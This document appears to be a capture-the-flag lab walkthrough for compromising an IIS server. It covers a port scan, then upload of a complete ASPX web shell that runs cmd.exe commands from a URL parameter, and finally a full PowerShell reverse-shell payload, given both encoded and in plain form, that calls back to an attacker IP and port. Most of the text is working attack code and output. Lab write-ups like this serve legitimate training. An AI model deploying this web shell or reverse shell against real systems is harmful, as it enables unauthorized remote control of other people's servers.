# IIS Web Shell Exploitation Walkthrough

This is a full step-by-step guide for exploiting a web application hosted on a Windows machine running IIS, where we gain remote code execution (RCE) through an uploaded `.aspx` web shell and eventually spawn a full reverse shell.

---

## 🔍 Step 1: Initial Port Scan with Nmap

Run a version scan to discover open services:

```bash
nmap -sV 192.168.191.192
```

### Output:

```
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
8000/tcp open  http          Microsoft IIS httpd 10.0
```

We notice two web servers — one on port `80` and another on port `8000`. Port `8000` had an upload panel. Port `80` looked empty at first glance.

---

## 💡 Step 2: Identify Upload Functionality

- Navigated to `http://192.168.191.192:8000/`
- Found an upload panel.
- Recognized the server is running **IIS**, which processes **`.aspx`** files (C#-based ASP.NET).
- This means we need to upload an **ASPX web shell**, not a PHP one.

---

## 🧬 Step 3: Build the Web Shell

We use a classic ASPX inline shell to run commands passed via the `cmd` parameter:

```bash
nano shell.aspx
```

### shell.aspx contents:

```aspx
<%@ Page Language="C#" Debug="true" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
    if (Request["cmd"] != null)
    {
        string strCmdText = "/c " + Request["cmd"];
        Process proc = new Process();
        proc.StartInfo.FileName = "cmd.exe";
        proc.StartInfo.Arguments = strCmdText;
        proc.StartInfo.UseShellExecute = false;
        proc.StartInfo.RedirectStandardOutput = true;
        proc.StartInfo.RedirectStandardError = true;
        proc.StartInfo.CreateNoWindow = true;
        proc.Start();
        string output = proc.StandardOutput.ReadToEnd() + proc.StandardError.ReadToEnd();
        Response.Write("<pre>" + output + "</pre>");
    }
%>
```

Then upload the file through the panel on port 8000.

---

## 🌐 Step 4: Discover Where the Upload Lands

There was a clue on the main page (port 8000) saying files are **served via port 80**.

So we try this:

```bash
curl "http://192.168.191.192/shell.aspx?cmd=whoami"
```

### Output:
```
nt authority\iusr
```

Boom — remote command execution confirmed.

---

## 🖥️ Step 5: Get a Full Reverse Shell (PowerShell)

### First, set up your listener:

```bash
nc -lvnp 4444
```

### Then trigger the web shell with a PowerShell reverse shell payload:

URL-encoded payload:

```
http://192.168.191.192/shell.aspx?cmd=powershell%20-NoP%20-NonI%20-W%20Hidden%20-Exec%20Bypass%20-Command%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27192.168.45.236%27%2C4444%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5BText.Encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
```

Or non-encoded version (to understand what it's doing):

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient('YOUR_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([Text.Encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

---

## 🏁 Step 6: Find the Flag

Now that you have a full shell, search the entire system for files containing the word `flag`:

```powershell
Get-ChildItem -Path C:\ -Recurse -Filter *flag* -ErrorAction SilentlyContinue | ForEach-Object { Get-Content $_.FullName }
```

This will recursively find and print all flag files on the system.

---

## ✅ Lab Complete

- Scanned the host.
- Found a hidden web shell location.
- Achieved RCE via `.aspx` shell.
- Spawned a full PowerShell reverse shell.
- Located and captured the flag.

**Success.**
